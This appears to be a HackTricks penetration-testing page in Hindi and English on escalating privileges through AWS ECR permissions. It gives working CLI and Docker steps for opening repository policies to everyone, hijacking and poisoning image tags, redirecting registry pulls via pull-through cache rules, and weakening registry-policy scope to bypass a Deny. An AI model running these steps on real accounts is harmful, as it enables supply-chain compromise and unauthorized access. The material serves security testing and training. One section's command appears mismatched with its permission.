# AWS - ECR Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECR

### `ecr:GetAuthorizationToken`,`ecr:BatchGetImage`

An attacker जिसके पास **`ecr:GetAuthorizationToken`** और **`ecr:BatchGetImage`** है वह ECR में login करके images डाउनलोड कर सकता है।

For more info on how to download images:

{{#ref}}
../../aws-post-exploitation/aws-ecr-post-exploitation/README.md
{{#endref}}

**Potential Impact:** ट्रैफ़िक में संवेदनशील जानकारी को इंटरसेप्ट करके indirect privesc।

### `ecr:GetAuthorizationToken`, `ecr:BatchCheckLayerAvailability`, `ecr:CompleteLayerUpload`, `ecr:InitiateLayerUpload`, `ecr:PutImage`, `ecr:UploadLayerPart`

An attacker जिनके पास ये सभी permissions हों **वो ECR में login करके images upload कर सकता है**। यह उन अन्य environments में privilege escalation के लिए उपयोगी हो सकता है जहाँ वे images उपयोग में हैं।

In addition, `ecr:PutImage` can be used to **overwrite an existing tag** (for example `stable` / `prod`) by uploading a different image manifest under that tag, effectively hijacking tag-based deployments.

यह विशेष रूप से प्रभावशाली होता है जब downstream consumers tag के आधार पर deploy करते हैं और tag changes पर **auto-refresh** करते हैं, जैसे:

- **Lambda container image functions** (`PackageType=Image`) referencing `.../repo:stable`
- ECS services / Kubernetes workloads pulling `repo:prod` (without digest pinning)
- Any CI/CD that redeploys on ECR events

ऐसे मामलों में, एक tag overwrite consumer environment में **remote code execution** और उस workload द्वारा उपयोग किए जा रहे IAM role तक privilege escalation का कारण बन सकता है (उदाहरण के लिए, एक Lambda execution role जिसमें `secretsmanager:GetSecretValue` हो)।

To learn how to upload a new image/update one, check:

{{#ref}}
../../aws-services/aws-eks-enum.md
{{#endref}}

### `ecr-public:GetAuthorizationToken`, `ecr-public:BatchCheckLayerAvailability, ecr-public:CompleteLayerUpload`, `ecr-public:InitiateLayerUpload, ecr-public:PutImage`, `ecr-public:UploadLayerPart`

Like the previous section, but for public repositories.

### `ecr:SetRepositoryPolicy`

An attacker with this permission could **change** the **repository** **policy** to grant himself (or even everyone) **read/write access**.\
उदाहरण के लिए, नीचे दिए उदाहरण में सभी को read access दिया गया है।
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
`my-policy.json` की सामग्री:
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "allow public pull",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr:BatchCheckLayerAvailability",
"ecr:BatchGetImage",
"ecr:GetDownloadUrlForLayer"
]
}
]
}
```
### `ecr-public:SetRepositoryPolicy`

पिछले सेक्शन जैसा ही, लेकिन सार्वजनिक रिपॉज़िटरीज़ के लिए।\
एक attacker ECR Public रिपॉज़िटरी की **रिपॉज़िटरी पॉलिसी को संशोधित** करके अनधिकृत सार्वजनिक पहुँच दे सकता है या अपनी privileges बढ़ा सकता है।
```bash
# Create a JSON file with the malicious public repository policy
echo '{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "MaliciousPublicRepoPolicy",
"Effect": "Allow",
"Principal": "*",
"Action": [
"ecr-public:GetDownloadUrlForLayer",
"ecr-public:BatchGetImage",
"ecr-public:BatchCheckLayerAvailability",
"ecr-public:PutImage",
"ecr-public:InitiateLayerUpload",
"ecr-public:UploadLayerPart",
"ecr-public:CompleteLayerUpload",
"ecr-public:DeleteRepositoryPolicy"
]
}
]
}' > malicious_public_repo_policy.json

# Apply the malicious public repository policy to the ECR Public repository
aws ecr-public set-repository-policy --repository-name your-ecr-public-repo-name --policy-text file://malicious_public_repo_policy.json
```
**संभावित प्रभाव**: अनधिकृत सार्वजनिक पहुँच ECR Public repository तक, जिससे किसी भी उपयोगकर्ता को images को push, pull, या delete करने की अनुमति मिल सकती है।

### `ecr:PutRegistryPolicy`

एक हमलावर जिसके पास यह अनुमति है, वह **रजिस्ट्री पॉलिसी** को **बदल** कर खुद को, अपने खाते (या यहाँ तक कि सभी को) **read/write access** दे सकता है।
```bash
aws ecr set-repository-policy \
--repository-name <repo_name> \
--policy-text file://my-policy.json
```
### ecr:CreatePullThroughCacheRule

ECR Pull Through Cache (PTC) नियमों का दुरुपयोग करके attacker-controlled upstream namespace को trusted private ECR prefix से मैप करें। इससे private ECR से इमेज खींचने वाले workloads बिना private ECR में कोई push किए हुए attacker की images पारदर्शी रूप से प्राप्त कर लेंगी।

- आवश्यक अनुमति: ecr:CreatePullThroughCacheRule, ecr:DescribePullThroughCacheRules, ecr:DeletePullThroughCacheRule. यदि ECR Public upstream उपयोग कर रहे हैं: ecr-public:* public repo बनाने/पुश करने के लिए।
- परीक्षित upstream: public.ecr.aws

Steps (example):

1. Prepare attacker image in ECR Public
# Get your ECR Public alias with: aws ecr-public describe-registries --region us-east-1
docker login public.ecr.aws/<public_alias>
docker build -t public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test .
docker push public.ecr.aws/<public_alias>/hacktricks-ptc-demo:ptc-test

2. Create the PTC rule in private ECR to map a trusted prefix to the public registry
aws ecr create-pull-through-cache-rule --region us-east-2 --ecr-repository-prefix ptc --upstream-registry-url public.ecr.aws

3. Pull the attacker image via the private ECR path (no push to private ECR was done)
docker login <account_id>.dkr.ecr.us-east-2.amazonaws.com
docker pull <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test
docker run --rm <account_id>.dkr.ecr.us-east-2.amazonaws.com/ptc/<public_alias>/hacktricks-ptc-demo:ptc-test

Potential Impact: चुने हुए prefix के तहत internal image names को hijack करके supply-chain का compromise। उस prefix का उपयोग करने वाला कोई भी workload जो private ECR से images खींचता है वह attacker-controlled content प्राप्त करेगा।

### `ecr:PutImageTagMutability`

इस permission का दुरुपयोग करके tag immutability वाले repository को mutable में बदलें और trusted tags (e.g., latest, stable, prod) को attacker-controlled content से overwrite करें।

- आवश्यक अनुमति: `ecr:PutImageTagMutability` के साथ push क्षमताएँ (`ecr:GetAuthorizationToken`, `ecr:InitiateLayerUpload`, `ecr:UploadLayerPart`, `ecr:CompleteLayerUpload`, `ecr:PutImage`)।
- प्रभाव: tag नाम बदले बिना immutable tags को चुपचाप बदलकर supply-chain compromise।

Steps (example):

<details>
<summary>Poison an immutable tag by toggling mutability</summary>
```bash
REGION=us-east-1
REPO=ht-immutable-demo-$RANDOM
aws ecr create-repository --region $REGION --repository-name $REPO --image-tag-mutability IMMUTABLE
acct=$(aws sts get-caller-identity --query Account --output text)
aws ecr get-login-password --region $REGION | docker login --username AWS --password-stdin ${acct}.dkr.ecr.${REGION}.amazonaws.com
# Build and push initial trusted tag
printf 'FROM alpine:3.19\nCMD echo V1\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Attempt overwrite while IMMUTABLE (should fail)
printf 'FROM alpine:3.19\nCMD echo V2\n' > Dockerfile && docker build -t ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod . && docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Flip to MUTABLE and overwrite
aws ecr put-image-tag-mutability --region $REGION --repository-name $REPO --image-tag-mutability MUTABLE
docker push ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
# Validate consumers pulling by tag now get the poisoned image (prints V2)
docker run --rm ${acct}.dkr.ecr.${REGION}.amazonaws.com/${REPO}:prod
```
</details>


#### Global registry hijack via ROOT Pull-Through Cache rule

विशेष `ecrRepositoryPrefix=ROOT` का उपयोग करके एक Pull-Through Cache (PTC) rule बनाएं, जो private ECR registry की root को किसी upstream public registry (जैसे, ECR Public) से मैप कर दे। private registry में मौजूद नहीं होने वाले किसी भी repository के लिए किया गया pull upstream से पारदर्शी रूप से serve होगा, जिससे private ECR में push किए बिना supply-chain hijacking संभव हो जाता है।

- आवश्यक अनुमतियाँ: `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`, `ecr:GetAuthorizationToken`.
- प्रभाव: `<account>.dkr.ecr.<region>.amazonaws.com/<any-existing-upstream-path>:<tag>` पर किए गए pulls सफल होंगे और upstream से प्राप्त private repos को स्वतः बना देंगे।

> ध्यान दें: `ROOT` rules के लिए, `--upstream-repository-prefix` छोड़ दें। इसे प्रदान करने पर मान्यकरण त्रुटि होगी।

<details>
<summary>डेमो (us-east-1, upstream public.ecr.aws)</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 1) Create ROOT PTC rule mapping to ECR Public (no upstream prefix)
aws ecr create-pull-through-cache-rule \
--region "$REGION" \
--ecr-repository-prefix ROOT \
--upstream-registry-url public.ecr.aws

# 2) Authenticate to private ECR and pull via root path (triggers caching & auto repo creation)
aws ecr get-login-password --region "$REGION" | docker login --username AWS --password-stdin ${ACCT}.dkr.ecr.${REGION}.amazonaws.com

# Example using an official mirror path hosted in ECR Public
# (public.ecr.aws/docker/library/alpine:latest)
docker pull ${ACCT}.dkr.ecr.${REGION}.amazonaws.com/docker/library/alpine:latest

# 3) Verify repo and image now exist without any push
aws ecr describe-repositories --region "$REGION" \
--query "repositories[?repositoryName==docker/library/alpine]"
aws ecr list-images --region "$REGION" --repository-name docker/library/alpine --filter tagStatus=TAGGED

# 4) Cleanup
aws ecr delete-pull-through-cache-rule --region "$REGION" --ecr-repository-prefix ROOT
aws ecr delete-repository --region "$REGION" --repository-name docker/library/alpine --force || true
```
</details>

### `ecr:PutAccountSetting` (रीजिस्ट्री पॉलिसी के Deny को बायपास करने के लिए `REGISTRY_POLICY_SCOPE` को डाउनग्रेड करें)

`ecr:PutAccountSetting` का दुरुपयोग करके रजिस्ट्री पॉलिसी स्कोप को `V2` (नीति सभी ECR actions पर लागू) से `V1` (नीति केवल `CreateRepository`, `ReplicateImage`, `BatchImportUpstreamImage` पर लागू) में बदलें। यदि कोई सख्त रजिस्ट्री पॉलिसी Deny `CreatePullThroughCacheRule` जैसे actions को ब्लॉक कर रही है, तो `V1` में डाउनग्रेड करने से वह प्रवर्तन हट जाता है और identity‑policy Allows प्रभावी हो जाते हैं।

- आवश्यक अनुमतियाँ: `ecr:PutAccountSetting`, `ecr:PutRegistryPolicy`, `ecr:GetRegistryPolicy`, `ecr:CreatePullThroughCacheRule`, `ecr:DescribePullThroughCacheRules`, `ecr:DeletePullThroughCacheRule`.
- प्रभाव: अस्थायी रूप से स्कोप को `V1` सेट करके रजिस्ट्री पॉलिसी Deny द्वारा पहले ब्लॉक किए गए ECR actions (उदा., PTC rules बनाना) करने की क्षमता।

कदम (उदाहरण):

<details>
<summary>CreatePullThroughCacheRule पर registry policy Deny को V1 में बदलकर बायपास करें</summary>
```bash
REGION=us-east-1
ACCT=$(aws sts get-caller-identity --query Account --output text)

# 0) Snapshot current scope/policy (for restore)
aws ecr get-account-setting --name REGISTRY_POLICY_SCOPE --region $REGION || true
aws ecr get-registry-policy --region $REGION > /tmp/orig-registry-policy.json 2>/dev/null || echo '{}' > /tmp/orig-registry-policy.json

# 1) Ensure V2 and set a registry policy Deny for CreatePullThroughCacheRule
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
cat > /tmp/deny-ptc.json <<'JSON'
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "DenyPTCAll",
"Effect": "Deny",
"Principal": "*",
"Action": ["ecr:CreatePullThroughCacheRule"],
"Resource": "*"
}
]
}
JSON
aws ecr put-registry-policy --policy-text file:///tmp/deny-ptc.json --region $REGION

# 2) Attempt to create a PTC rule (should FAIL under V2 due to Deny)
set +e
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws
RC=$?
set -e
if [ "$RC" -eq 0 ]; then echo "UNEXPECTED: rule creation succeeded under V2 deny"; fi

# 3) Downgrade scope to V1 and retry (should SUCCEED now)
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V1 --region $REGION
aws ecr create-pull-through-cache-rule \
--region $REGION \
--ecr-repository-prefix ptc-deny-test \
--upstream-registry-url public.ecr.aws

# 4) Verify rule exists
aws ecr describe-pull-through-cache-rules --region $REGION \
--query "pullThroughCacheRules[?ecrRepositoryPrefix=='ptc-deny-test']"

# 5) Cleanup and restore
aws ecr delete-pull-through-cache-rule --region $REGION --ecr-repository-prefix ptc-deny-test || true
if jq -e '.registryPolicyText' /tmp/orig-registry-policy.json >/dev/null 2>&1; then
jq -r '.registryPolicyText' /tmp/orig-registry-policy.json > /tmp/_orig.txt
aws ecr put-registry-policy --region $REGION --policy-text file:///tmp/_orig.txt
else
aws ecr delete-registry-policy --region $REGION || true
fi
aws ecr put-account-setting --name REGISTRY_POLICY_SCOPE --value V2 --region $REGION
```
</details>

{{#include ../../../../banners/hacktricks-training.md}}
